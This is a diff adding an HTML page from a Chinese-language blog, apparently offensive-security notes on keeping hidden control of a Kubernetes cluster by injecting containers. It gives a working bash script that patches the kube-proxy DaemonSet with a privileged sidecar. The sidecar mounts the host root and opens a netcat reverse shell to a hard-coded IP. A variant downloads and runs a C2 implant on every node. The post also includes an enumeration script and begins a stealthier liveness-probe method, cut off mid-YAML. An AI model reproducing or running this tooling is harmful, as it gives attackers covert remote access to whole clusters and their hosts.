@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="zh-CN" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<title>k8s权限维持-动态容器注入 | My Hugo Knowledgebase</title>
+
+    <link rel="stylesheet" href="/css/main.css">
+
+
+      <script src="/js/main.js"></script>
+
+
+</head>
+<body>
+  <header>
+    <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
+  <a href="/" style="font-weight: bold; font-size: 1.2em; text-decoration: none; color: var(--text-color);">My Hugo Knowledgebase</a>
+  <button id="theme-toggle" class="theme-toggle" aria-label="Toggle Dark Mode" style="font-size: 0.9em;">
+    Theme
+  </button>
+</div>
+
+  </header>
+  <main>
+    
+  <h1>k8s权限维持-动态容器注入</h1>
+
+  
+  
+  <time datetime="2025-01-01T00:00:00&#43;08:00">January 1, 2025</time>
+
+  <h1 id="动态容器注入-一种隐蔽的k8s权限维持方法">动态容器注入-一种隐蔽的k8s权限维持方法</h1>
+<p>恶意pod-&gt;反弹shell-&gt;挂载宿主机(node)/-&gt;cron写定时任务反弹shell-&gt;master-node</p>
+<p>k8s控制器</p>
+<p>众所周知，k8s的持久化有很多方法：</p>
+<ul>
+<li>部署后门pod</li>
+<li>部署cronjob</li>
+<li>部署shadowApiserver</li>
+<li>部署恶意deployment</li>
+<li>部署恶意deamonset</li>
+</ul>
+<p>这些方法大家想必都很熟悉了，而这些方法都需要我们额外创建新的pod或者k8s控制器，k8s中多出来一些pod和控制器很容易就被发现了，有没有什么能够利用原有控制器和pod的办法呢？</p>
+<p>这里就有一种叫做动态容器注入的方式</p>
+<p>目前来说的注入方式有两种，一种是将一个sidecar容器注入到原有pod中，一种是将存活探针注入到原有pod中</p>
+<h2 id="利用sidecar容器技术进行注入">利用sidecar容器技术进行注入</h2>
+<p>这里提到一个技术叫sidecar，简单理解就是在同一个 Pod 里额外放一只容器，为主业务容器提供增强能力，生命周期与主容器完全一致（同启、同停、同网络、同存储卷）。具体技术用途可以在官方文档了解：https://kubernetes.io/zh-cn/docs/concepts/workloads/pods/sidecar-containers/</p>
+<p>这里可以利用k8s控制器，像daemonset这类，我们可以更改它yaml的spec.template的内容，并replace触发其更新，这样就能实现在原容器上增加一个恶意的sidecar容器，而不用增加一个新的控制器或独立pod</p>
+<p>为什么选择daemonset：</p>
+<ul>
+<li>
+<p>它能够确保所有节点（包括新增节点）上都运行一个Pod</p>
+</li>
+<li>
+<p>如果有Pod退出，DaemonSet将在对应节点上自动重建一个Pod</p>
+</li>
+</ul>
+<p>值得一题的是，我们注入的恶意容器需要怎么配置比较好呢，思路可以从去除容器与宿主机隔离的角度出发：</p>
+<ul>
+<li>
+<p>容器是特权的（相当于docker run的时候带了–privileged选项）</p>
+</li>
+<li>
+<p>容器与宿主机共享网络和PID命名空间（打破命名空间隔离）</p>
+</li>
+<li>
+<p>容器内挂载宿主机根目录（打破文件系统隔离）</p>
+</li>
+</ul>
+<p>这样一来，我们获得sidecar容器的shell实际上和节点的shell区别就不大了</p>
+<h3 id="基础注入">基础注入</h3>
+<p>一般来说，我们会考虑对kube-system命名空间中已运行的daemonset进行注入，常用的是k8s中的kube-proxy，比如接下来这个例子：</p>
+<p>我们探测一下是否存在kube-proxy：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubectl get daemonset -n kube-system
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1759568770178.png" alt="QQ_1759568770178"></p>
+<p>我们也可以看到这个daemonset控制的pod：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1759569016043.png" alt="QQ_1759569016043"></p>
+<p>接下来我们来读这个daemonset的yaml：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubectl get daemonset -n kube-system -o yaml
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1759569170555.png" alt="QQ_1759569170555"></p>
+<p>我们可以在这个yaml基础上进行修改实现注入：</p>
+<ul>
+<li>
+<p>我们先分析原yaml的spec：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span>  <span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">revisionHistoryLimit</span>: <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">selector</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">matchLabels</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">k8s-app</span>: <span style="color:#ae81ff">kube-proxy</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">template</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">creationTimestamp</span>: <span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">labels</span>:
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">k8s-app</span>: <span style="color:#ae81ff">kube-proxy</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">containers</span>:
+</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">command</span>:
+</span></span><span style="display:flex;"><span>          - <span style="color:#ae81ff">/usr/local/bin/kube-proxy</span>
+</span></span><span style="display:flex;"><span>          - --<span style="color:#ae81ff">config=/var/lib/kube-proxy/config.conf</span>
+</span></span><span style="display:flex;"><span>          - --<span style="color:#ae81ff">hostname-override=$(NODE_NAME)</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">env</span>:
+</span></span><span style="display:flex;"><span>          - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">NODE_NAME</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">valueFrom</span>:
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">fieldRef</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">fieldPath</span>: <span style="color:#ae81ff">spec.nodeName</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">image</span>: <span style="color:#ae81ff">registry.k8s.io/kube-proxy:v1.30.14</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">imagePullPolicy</span>: <span style="color:#ae81ff">IfNotPresent</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">name</span>: <span style="color:#ae81ff">kube-proxy</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">resources</span>: {}
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">securityContext</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">privileged</span>: <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">terminationMessagePath</span>: <span style="color:#ae81ff">/dev/termination-log</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">terminationMessagePolicy</span>: <span style="color:#ae81ff">File</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">volumeMounts</span>:
+</span></span><span style="display:flex;"><span>          - <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/var/lib/kube-proxy</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">name</span>: <span style="color:#ae81ff">kube-proxy</span>
+</span></span><span style="display:flex;"><span>          - <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/run/xtables.lock</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">name</span>: <span style="color:#ae81ff">xtables-lock</span>
+</span></span><span style="display:flex;"><span>          - <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/lib/modules</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">name</span>: <span style="color:#ae81ff">lib-modules</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">readOnly</span>: <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">dnsPolicy</span>: <span style="color:#ae81ff">ClusterFirst</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">hostNetwork</span>: <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">nodeSelector</span>:
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">kubernetes.io/os</span>: <span style="color:#ae81ff">linux</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">priorityClassName</span>: <span style="color:#ae81ff">system-node-critical</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">restartPolicy</span>: <span style="color:#ae81ff">Always</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">schedulerName</span>: <span style="color:#ae81ff">default-scheduler</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">securityContext</span>: {}
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">serviceAccount</span>: <span style="color:#ae81ff">kube-proxy</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">serviceAccountName</span>: <span style="color:#ae81ff">kube-proxy</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">terminationGracePeriodSeconds</span>: <span style="color:#ae81ff">30</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">tolerations</span>:
+</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">operator</span>: <span style="color:#ae81ff">Exists</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">volumes</span>:
+</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">configMap</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">defaultMode</span>: <span style="color:#ae81ff">420</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">name</span>: <span style="color:#ae81ff">kube-proxy</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">name</span>: <span style="color:#ae81ff">kube-proxy</span>
+</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">hostPath</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/run/xtables.lock</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">type</span>: <span style="color:#ae81ff">FileOrCreate</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">name</span>: <span style="color:#ae81ff">xtables-lock</span>
+</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">hostPath</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/lib/modules</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">type</span>: <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">name</span>: <span style="color:#ae81ff">lib-modules</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">updateStrategy</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">rollingUpdate</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">maxSurge</span>: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">maxUnavailable</span>: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">type</span>: <span style="color:#ae81ff">RollingUpdate</span>
+</span></span></code></pre></div><p>我们只需要在此基础上增加两个新对象：</p>
+<ul>
+<li>一个新 <code>volume</code>（hostPath=/，把整个宿主机根目录挂进来）</li>
+<li>一个新 <code>container</code>（sidecar，名字/镜像看似正常，实际跑恶意命令）</li>
+</ul>
+<p>那么我们可以写一个自动注入脚本，实现注入一个挂载宿主机根目录并且启动时会执行反弹shell的sidecar‘容器：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e"># inject-cache.sh -- 自动提取原yaml并注入“cache”边车容器</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 用法：./inject-cache.sh </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set -e
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#################### 1. 自动提取原yaml ####################</span>
+</span></span><span style="display:flex;"><span>image<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>kubectl -n kube-system get ds kube-proxy -o yaml <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>        | awk <span style="color:#e6db74">&#39;$1==&#34;image:&#34;{print $2}&#39;</span> | head -n1<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#################### 2. 固定变量 ####################</span>
+</span></span><span style="display:flex;"><span>volume_name<span style="color:#f92672">=</span>cache
+</span></span><span style="display:flex;"><span>mount_path<span style="color:#f92672">=</span>/var/kube-proxy-cache
+</span></span><span style="display:flex;"><span>ctr_name<span style="color:#f92672">=</span>kube-proxy-cache
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#################### 3. 构建注入部分 ####################</span>
+</span></span><span style="display:flex;"><span>volume_block<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - name: </span><span style="color:#e6db74">${</span>volume_name<span style="color:#e6db74">}</span><span style="color:#e6db74">\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        hostPath:\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          path: /\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          type: Directory&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>container_block<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - name: </span><span style="color:#e6db74">${</span>ctr_name<span style="color:#e6db74">}</span><span style="color:#e6db74">\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        image: alpine:latest\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        imagePullPolicy: IfNotPresent\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        command: [\&#34;/bin/sh\&#34;]\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        args:\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        - -c\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        - &#39;set -x; nc 8.156.69.160 2333 -e /bin/sh &amp; tail -f /dev/null&#39;\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        securityContext:\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          privileged: true\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        volumeMounts:\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        - mountPath: </span><span style="color:#e6db74">${</span>mount_path<span style="color:#e6db74">}</span><span style="color:#e6db74">\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          name: </span><span style="color:#e6db74">${</span>volume_name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#################### 4. 使用 awk 注入并滚动更新 ####################</span>
+</span></span><span style="display:flex;"><span>kubectl  -n kube-system get ds kube-proxy -o yaml <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>| awk -v vb<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$volume_block<span style="color:#e6db74">&#34;</span> -v cb<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$container_block<span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    /^      volumes:/   { print; print vb; next }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    /^      containers:/ { print; print cb; next }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>| kubectl replace -f -
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[+] Injection done, waiting for rollout...&#34;</span>
+</span></span><span style="display:flex;"><span>kubectl -n kube-system rollout status ds/kube-proxy
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[+] All nodes now run the cache container with host root at </span><span style="color:#e6db74">${</span>mount_path<span style="color:#e6db74">}</span><span style="color:#e6db74"> and privileged=true&#34;</span>
+</span></span></code></pre></div></li>
+<li>
+<p>在vps上监听，并在master节点上执行脚本：
+<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1759586930293.png" alt="QQ_1759586930293"></p>
+<p>可以看到注入成功，挂载的宿主机根目录位于/var/kube-proxy-cache</p>
+</li>
+<li>
+<p>vps成功收到反弹shell且能访问宿主机：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1759586763452.png" alt="QQ_1759586763452"></p>
+</li>
+<li>
+<p>此时在master节点查看被注入后的kube-proxy，可以看到只有数量增加了，相当隐蔽：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1759587392587.png" alt="QQ_1759587392587"></p>
+</li>
+</ul>
+<h3 id="思路优化">思路优化</h3>
+<p>值得一提的是，我们知道名为kube-proxy的daemonset控制了每个节点上的kube-proxy相关pod，那么我们在进行注入后，每个节点上的kube-proxy相关pod都会增加一个恶意的sidecar容器，也就是说：<strong>我们也可以通过此方法一次性获得每个节点上恶意容器的反弹shell，再逃逸即可获得所有node节点权限，较为方便</strong></p>
+<p>那么这里就又有问题了：使用nc来监听反弹的shell，一次只能接受一个，所以如果按照上面脚本的方法来让所有恶意容器反弹shell不是一个好办法，于是我们可以尝试使用c2木马来进行上线</p>
+<p>并且c2上线还有个好处：</p>
+<blockquote>
+<p>一旦由于操作不当等原因不小心断开了一个反连的shell，对应Pod将运行结束，DaemonSet监测到Pod退出，将自动在相同节点上重建一个新Pod，我们就能够在c2上重新收获一个反弹shell，可以很好的提升可用性</p>
+</blockquote>
+<p>那么最简单、通用的修改方式就是改注入脚本的container_block片段，把反弹shell的命令改为访问我们的vps，下载并执行木马：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>container_block<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - name: </span><span style="color:#e6db74">${</span>ctr_name<span style="color:#e6db74">}</span><span style="color:#e6db74">\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        image: alpine:latest\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        imagePullPolicy: IfNotPresent\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        command: [\&#34;/bin/sh\&#34;]\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        args:\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        - -c\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        - &#39;set -x; wget http://&lt;IP:PORT&gt;/kube-proxy -O /root/kube-proxy &amp;&amp; chmod 777 /root/kube-proxy &amp;&amp; /root/kube-proxy&#39;\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        securityContext:\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          privileged: true\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        volumeMounts:\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        - mountPath: </span><span style="color:#e6db74">${</span>mount_path<span style="color:#e6db74">}</span><span style="color:#e6db74">\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          name: </span><span style="color:#e6db74">${</span>volume_name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><p>这样在master节点执行脚本后，就能一次性将k8s内的所有节点的kube-proxy注入容器上线C2：
+<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251005164950032.png" alt="image-20251005164950032"></p>
+<p>另外大家可以进一步思考，比如如何针对自己不同的C2实现不同的无文件落地上线方案，这里就不多研究了</p>
+<h2 id="利用存活探针技术进行注入">利用存活探针技术进行注入</h2>
+<h3 id="基础注入-1">基础注入</h3>
+<p>那么上面的方案还有其他值得注意的问题吗？当然，使用sidecar容器注入会导致pod显示的容器数量增加，不好绕过细致的排查；另外，可以注意到上面注入容器的时候，我们拉取了新的镜像<code>alpine:latest</code>，那如果当前内网环境中不允许从外部拉取容器呢？</p>
+<p>这里就可以用到一个新的思路：利用探针</p>
+<p>探针是在容器运行周期中触发的一个检测机制，探针的详细介绍可以在官方文档看到：https://kubernetes.io/zh-cn/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/</p>
+<p>探针有三种，其中存活探针可以在容器整个生命周期中持续触发，那么我们可以尝试通过存活探针来实现不拉取镜像的动态容器注入：</p>
+<ul>
+<li>使用存活探针的exec检查模式实现命令执行反弹shell</li>
+<li>使用探针参数<code>failureThreshold: 2147483647</code>，设置最大的失败重试次数，实现几乎“无限次”重复执行</li>
+<li>使用<code>periodSeconds: x</code>参数来设置间隔为x秒</li>
+</ul>
+<p>为了方便反弹shell，首先需要找到所以daemonset控制的pod是否有bash或perl等语言解释器，我们可以使用这样一个脚本来寻找：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ds in <span style="color:#66d9ef">$(</span>kubectl get daemonsets -A -o jsonpath<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;{range .items[*]}{.metadata.namespace}/{.metadata.name}{&#34;\n&#34;}{end}&#39;</span><span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>  ns<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo $ds | cut -d/ -f1<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>  name<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo $ds | cut -d/ -f2<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># 获取 selector 的键值对数组</span>
+</span></span><span style="display:flex;"><span>  keys<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>kubectl get daemonset $name -n $ns -o jsonpath<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;{.spec.selector.matchLabels}&#39;</span> | tr -d <span style="color:#e6db74">&#39;{}&#39;</span> | tr <span style="color:#e6db74">&#39;,&#39;</span> <span style="color:#e6db74">&#39;\n&#39;</span> | awk -F: <span style="color:#e6db74">&#39;{gsub(/&#34;/,&#34;&#34;,$1); gsub(/&#34;/,&#34;&#34;,$2); print $1&#34;=&#34;$2}&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># 拼接成 label selector 字符串</span>
+</span></span><span style="display:flex;"><span>  selector<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> k in $keys; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -z <span style="color:#e6db74">&#34;</span>$selector<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>      selector<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$k<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>      selector<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$selector<span style="color:#e6db74">,</span>$k<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># 获取 Pod</span>
+</span></span><span style="display:flex;"><span>  pod<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>kubectl get pods -n $ns -l <span style="color:#e6db74">&#34;</span>$selector<span style="color:#e6db74">&#34;</span> -o jsonpath<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;{.items[0].metadata.name}&#39;</span> 2&gt;/dev/null<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -z <span style="color:#e6db74">&#34;</span>$pod<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;No pod found for </span>$ns<span style="color:#e6db74">/</span>$name<span style="color:#e6db74">, skipping...&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  echo <span style="color:#e6db74">&#34;Checking interpreters in </span>$ns<span style="color:#e6db74">/</span>$name<span style="color:#e6db74"> (</span>$pod<span style="color:#e6db74">):&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> interpreter in sh bash python3 python node perl ruby; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>    kubectl exec -n $ns $pod -- which $interpreter &amp;&gt;/dev/null <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;  </span>$interpreter<span style="color:#e6db74"> found&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><p>比如这里通过上面的脚本发现两个有bash，有一个甚至有perl：
+<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1760005958077.png" alt="QQ_1760005958077"></p>
+<p>由于kube-flannel/kube-flannel-ds更为常见，所以我们从这个pod下手，首先查看其daemonset的yaml的spec字段：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">revisionHistoryLimit</span>: <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">selector</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">matchLabels</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">app</span>: <span style="color:#ae81ff">flannel</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">template</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">creationTimestamp</span>: <span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">labels</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">app</span>: <span style="color:#ae81ff">flannel</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">tier</span>: <span style="color:#ae81ff">node</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">affinity</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">nodeAffinity</span>:
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">requiredDuringSchedulingIgnoredDuringExecution</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">nodeSelectorTerms</span>:
+</span></span><span style="display:flex;"><span>            - <span style="color:#f92672">matchExpressions</span>:
+</span></span><span style="display:flex;"><span>              - <span style="color:#f92672">key</span>: <span style="color:#ae81ff">kubernetes.io/os</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">operator</span>: <span style="color:#ae81ff">In</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">values</span>:
+</span></span><span style="display:flex;"><span>                - <span style="color:#ae81ff">linux</span>
